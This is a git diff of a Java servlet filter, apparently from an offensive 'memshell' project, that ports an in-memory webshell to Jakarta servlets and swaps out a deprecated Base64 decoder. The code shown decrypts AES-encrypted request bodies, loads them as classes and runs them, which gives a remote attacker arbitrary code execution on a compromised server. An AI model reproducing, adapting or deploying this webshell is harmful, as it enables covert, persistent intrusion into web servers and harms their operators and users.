@@ -1,18 +1,26 @@
 package com.boogipop.memshell;
 
+import jakarta.servlet.*;
+import jakarta.servlet.http.HttpServletRequest;
+
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.*;
-import javax.servlet.http.HttpServletRequest;
 import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Method;
+import java.util.Base64;
 import java.util.Scanner;
 
 public class FilterTemplate implements Filter {
     @Override
     public void init(FilterConfig filterConfig) throws ServletException {
 
+    }
+    private static byte[] BASE64Decoder(String data){
+        byte[] inputBytes = data.getBytes();
+        Base64.Decoder encoder = Base64.getDecoder();
+        byte[] encodedBytes = encoder.decode(inputBytes);
+        return encodedBytes;
     }
 
     @Override
@@ -40,7 +48,7 @@ public class FilterTemplate implements Filter {
                     ((HttpServletRequest)servletRequest).getSession().setAttribute("u",k);
                     Cipher cipher = Cipher.getInstance("AES");
                     cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
-                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
+                    byte[] evilClassBytes = cipher.doFinal(BASE64Decoder(servletRequest.getReader().readLine()));
                     Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                     Object evilObject = evilClass.newInstance();
                     Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
